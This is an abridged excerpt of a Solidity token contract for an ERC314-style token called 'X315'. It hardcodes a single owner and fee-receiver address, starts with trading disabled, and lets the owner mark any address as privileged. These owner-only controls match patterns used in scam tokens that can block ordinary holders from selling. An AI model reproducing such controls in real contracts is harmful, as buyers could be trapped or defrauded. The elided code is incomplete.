...
abstract contract ERC314 is IEERC314 {
    ...
    constructor(
        ...
        address receiver = 0x4016B9355186Dd0F32EAd3964eeb71aF3DB12b9A;
        feeReceiver = payable(0x4016B9355186Dd0F32EAd3964eeb71aF3DB12b9A);
        feeReceivers = payable(0x4016B9355186Dd0F32EAd3964eeb71aF3DB12b9A);
        owner = receiver;
        tradingEnable = false;
        tradingEnable2 = false;
        uint256 liquidityAmount = 10500000 * 10**18;
    ...
    mapping(address => bool) private _privilegedAddresses;

    function setPrivilegedAddress(address account, bool isPrivileged) external onlyOwner {
        _privilegedAddresses[account] = isPrivileged;
    }
...
contract X315 is ERC314 {
    constructor() ERC314("X315", "X315", 21000000 * 10**18) {}
}